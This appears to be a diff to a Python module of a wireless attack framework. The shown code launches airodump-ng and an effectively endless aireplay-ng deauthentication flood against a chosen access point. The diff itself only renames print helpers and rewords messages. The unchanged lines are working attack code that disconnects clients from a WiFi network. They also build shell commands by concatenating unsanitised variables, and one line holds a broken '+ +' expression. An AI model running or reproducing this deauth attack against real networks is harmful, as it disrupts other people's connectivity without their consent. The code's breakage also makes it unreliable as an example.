@@ -59,8 +59,8 @@ changelog = "Version 1.0:\n\trelease"
 
 
 def run():
-	printInfo("Attack has been started on: " + variables['essid'][0])
-	printInfo("Use command 'stop' to end attack." + colors.end)
+	printInform("Attack has been started on: " + variables['essid'][0])
+	printInform("Use command 'stop' to stop attack." + colors.end)
 	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'][0] + " --bssid " + variables['bssid'][0] + " " + variables['mon'][0] + " &"
 	os.system(xterm_3)
 	xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'][0] + " -e " + variables['essid'][0] + " " + variables['mon'][0] + " &"
@@ -80,4 +80,4 @@ def scan(args):
 	xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'][0] + " &"
 	subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	os.system(xterm_2)
-	printSuccess("Scan started...")
+	printInfo("Scanning...")
